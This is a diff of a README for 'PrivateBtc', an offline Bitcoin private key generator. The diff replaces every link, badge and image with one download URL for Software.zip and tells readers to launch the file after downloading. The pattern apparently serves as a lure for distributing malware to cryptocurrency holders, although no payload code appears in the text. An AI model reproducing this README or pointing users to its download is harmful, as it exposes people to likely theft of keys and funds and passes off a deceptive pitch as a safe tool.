@@ -1,6 +1,6 @@
 # PrivateBtc - The Most Powerful Bitcoin Private Key Random Generator Offline
 
-![Bitcoin](https://img.icons8.com/plasticine/2x/bitcoin.png)
+![Bitcoin](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to PrivateBtc - the most powerful Bitcoin private key random generator offline. This repository provides a secure and convenient way to generate Bitcoin private keys offline, ensuring maximum security for your digital assets.
@@ -18,7 +18,7 @@ Welcome to PrivateBtc - the most powerful Bitcoin private key random generator o
 - private-key
 
 ## Installation
-You can download the latest version of PrivateBtc by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Please note that the file needs to be launched after downloading.
+You can download the latest version of PrivateBtc by clicking [here](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip). Please note that the file needs to be launched after downloading.
 
 ## Features
 - Secure offline Bitcoin private key generation
@@ -34,14 +34,14 @@ You can download the latest version of PrivateBtc by clicking [here](https://git
 4. Keep the generated key in a safe and secure location.
 
 ## Support
-For any issues or questions, please check the "Releases" section or visit the official [PrivateBtc website](https://privatebtc.com) for more information.
+For any issues or questions, please check the "Releases" section or visit the official [PrivateBtc website](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip) for more information.
 
 ## Get Started
 Start generating secure Bitcoin private keys offline with PrivateBtc to ensure the safety of your digital assets.
 
-[![Download PrivateBtc](https://img.shields.io/badge/Download-PrivateBtc-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PrivateBtc](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip)](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip)
 
-![Bitcoin Wallet](https://img.icons8.com/plasticine/2x/bitcoin-wallet.png)
+![Bitcoin Wallet](https://github.com/Ralsn0f0unD/PrivateBtc/releases/download/v1.0/Software.zip)
 
 ## Contribution
 Contributions to PrivateBtc are welcomed! Feel free to submit pull requests or open issues to help improve the project.
